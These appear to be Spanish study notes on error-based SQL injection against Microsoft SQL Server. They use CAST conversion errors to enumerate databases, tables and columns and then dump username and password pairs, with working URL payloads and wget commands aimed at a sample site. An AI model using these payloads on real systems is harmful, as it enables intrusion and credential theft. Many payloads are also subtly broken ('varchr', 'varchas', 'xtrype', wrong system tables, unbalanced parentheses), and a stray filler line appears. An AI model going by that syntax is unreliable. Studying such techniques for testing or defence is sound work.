# MS SQL
Los Schemas son DB con el propósito de describir otros DB definidos por los usuarios en el sistema.

El sa es el super admin y tiene acceso al master DB, el master DB contienes schemas de los user-defined DBs.

Queremos conocer primero la versión de la DB para poder construir el exploit. Para esto forzamos al DBMS mostrar un error incluyedo la versión.

Usamos el trigger a type conversion error

## CAST technique

`99999 or 1 in (SELECT TOP 1 CAST (FIELDNAME as varchar(4096)) from TABLENAME WHERE FIELDNAME not in (LISTA)); --`

Esto inyectado en test.asp?id=PAYLOAD

- 9999 es a bogous value para hacer cumplir el booleano FALSE y pasar al query
- or 1 in es la sentencia que gatillará el error, estamos pidiendo que el DB busque un int en una columna varchar
- CAST (FIELDNAME as varchar(4096)) aquí insertamos la columna que queremos dumpear, tamibén una columna de un user-defined DB o una column de DB "especial". FIELDNAME puede ser una SQL fucntion como user_name() o una variable como @@version.
- WHERE FIELDNAME not in (LISTA) para dumpear la DB, esta parte puede ser omitid, ajustada dependiendo de la tabla que se quiera extraer.

Extrayendo la version de SQL Server:

`99999999 or 1 in (SELECT TOP 1 CAST (@@version as varchar(4096)))--`

![[Pasted image 20240316065902.png]]

Estructura de la master DataBase

[master Database - SQL Server | Microsoft Learn](https://learn.microsoft.com/en-us/sql/relational-databases/databases/master-database?redirectedfrom=MSDN&view=sql-server-ver16)

### Dumping DATABASE data

**Enumeración de DBs**

Primero debemos determinar los privilegios que tenemos extrayendo nuestro usuario actual

 `99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --`

![[Pasted image 20240316065916.png]]

En este caso no tenemos privilegios ya que el user es 'user' y no como tendría 'as'
Enumeramos las DB a los que 'user' tiene acceso iterando a través del MASTER DB

`9999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchr(4096))) --`

- DB_NAME() function acceder al master..sysdatabases table el cual almacena todas las bases de datos instaladas en el servidor, en este caso veremos  a los que tiene acceso 'user'

`Modificamos db_name(1) luego con 2 y así sucesivamente hasta que no podamos enumerar mas DB`

**Enumeración de Tablas**

`9999 or 1 in (SELECT TOP 1 CAST (name as varchar(4096)) FROM database_name..sysdatabase WHERE xtype='U' and name NOT IN lista_tabla_conocida`

- Xtype='U' se refiere a que solo extraiga user-defined tables
- name NOT IN lista_tabla_conocida name es una columna del "sysobjects" special table. Cada vez que encontramos una nueva tabla, lo adicionamos al NOT IN list. Esto es necesario porque el error muestra solo el nombre de la primera tabla


**Enumeración de Columnas**

99999 or 1 in (SELECT TOP 1 CAST (db_name..syscolumns.nmae as varchr(4096)) FROM db_name..syscolumns,db_name..sysobjects WHERE db_name..syscolumns.id=db_name ..sysobjects.id AND db_name..sysobjects.name=table_name AND db_name..syscolumns.name NOT IN (list_columna_conocida)); --

- Db_name es el nombre de la DB que estamos trabajando
- Table_name es el nombre de la tabla
- List_columna_conocida es la lista de las columnas que queremos retrieve.

**Dumpeo de Datos**

Dumpeamos usando la misma técnica del schema enumeration, gatillando errores dependiendo del tipo de datos del campo.

`99999 or 1 in (SELECT TOP 1 CAST (column_name as varchar(4096)) from data_base..table_name WHERE colum_name NOT IN (retrieved_data_list)); --`

`En el ejemplo usamos: page.php?id=1 donde se indetificó la tabla "users" en la base de datos "cms"`

`La tabla contiene las siguientes columnas: id (int), username(varchar) y password (varchar)`

`Para extraer los ID values, usamos el siguiente comando según el ejemplo`

`99999 or 1 in (SELECT TOP 1 CAST (id as varchar)%2bchar(64) from cms..users WHERE id NOT IN ('')); --`

- %2b es "+" y char(64) es el ASCII para @: La concatenación con @ segura que el id selecto sea de tipo varchar haciendo posible de esta manera el CAST error

![[Pasted image 20240316070300.png]]

Para el siguiente valor, excluimos el '1' en el NOT IN list

`99999 or 1 in (SELECT TOP 1 CAST (id as varchar)%2bchar(64) from cms..users WHERE id NOT IN ('1')); --`

![(SQL Serve: Native Client 10 . O ] [SQL Conversion 
tailed when converting the varchar value to data type int .](file:///C:/Users/fredd/AppData/Local/Temp/msohtmlclip1/02/clip_image005.png)

Para extraer el password usamos:

`99999 OR 1 IN (SELECT TOP 1 CAST (username as varchar) from cms..users WHERE id=1); -- -`

 `Podemos usar los mismo para el passoword que es varchar o extraer user/password en una consulta concatenada`

`99999 OR 1 IN (SELECT username%2bchar(64)password from cms..users WHERE id=1); -- -`

## Ejemplos Explotación


ADSDASDAS


`Id=1'`*Pobramos con un single quote*
|Id=1);-- - *Intentamos con paréntesis y comentando, si funciona veremos que no hay un error en la página|*
|Id=1 or @@version=1);-- -<br><br>Id=1 or @@version=1';-- -|Dependiendo del caso, nos mostrará un error de que no se puede convertir @@version en intenger con la versión|
|Id=1 or db_name()=1);-- -|Muestra el DB name en un error de conversión|
|Id=1 or db_name(0)=1);-- -<br><br>Id=1 or db_name(1)=1);-- -|0 es el actual DB, y 1 revela el master BD, 2,3 revelarían otras. Cuando no haya más, ya no habrá error en el site|
|Id=1 or user_name(0)=1);-- -<br><br>Id=1 or user_name(1)=1);-- -|Lo mismo para user name, enumeramos los usuarios de la DB. Sin parámetros muestra el usuario actual|
|Id=-1 or 1 IN (SELECT TOP 1 CAST(@@version as varchas(4096))))--|Extraermos la versión de la DB|

Dado que escribir comandos directamente en el URL bar, podemos usar wget para inyectar:

|   |   |
|---|---|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(@@version as varchas(4096))))--" -q -O -|Submit nuestro payload e imprimirlo en estándar outout|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(db_name() as varchas(4096))))--" -q -O -|Para extraer el DB server name<br><br>OUTPUT:'usrmanagement'|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(name as varchas(4096)) FROM usrmanagement..sysobjects WHERE xtrype='U'))--" -q -O -|Extrae el nombre de la primera tabla de la DB|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(name as varchas(4096)) FROM usrmagement..sysobjects WHERE xtrype='U' AND name NOT IN ('tabla1')))--" -q -O -|Muestra la tabla 2, y hacemos lo mismo sucesivamente para las otras. Cuando no tengas más que mostrar, la applicación mostrará el normal output<br><br>OUTPUT:'accounts'|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(usrmanagement..syscolumns.name as varchas(4096)) FROM usrmagement..syscolumns, usrmanagement..sysobjects WHERE usrmanagement..syscolumns.id=usrmanagement..sysobjects.id AND usermanagement..sysobjects.name='accounts'))--" -q -O -|Buscamos la primera columna de la tabla 'accounts"<br><br>OUTPUT: 'password'<br><br>OUTPUT2:'username'|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(usrmanagement..syscolumns.name as varchas(4096)) FROM usrmanagement..syscolumns, usrmanagement..sysobjects WHERE usrmanagement..syscolumns.id=usrmanagement..sysobjects.id AND usermanagement..sysobjects.name='accounts' AND usrmanagement..syscolumns.name NOT IN ('password'))--" -q -O -|Filtramos el resultado previo para extraer la segunda columna|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(username%2b'\|'%2bpassword as varchas(4096)) FROM usrmanagement..accounts))--" -q -O -|Extraemos el prime valor de las dos columnas: 'username' y 'password' concatenadas<br><br>Output:'Aministrator\|pass123'|
|>wget "example.test/prodcutos?Id=-1 or 1 IN (SELECT TOP 1 CAST(username%2b'\|'%2bpassword as varchas(4096)) FROM usrmanagement..accounts WHERE  unsername NOT IN ('Administrator'))--" -q -O -|El siguiente par concatenado|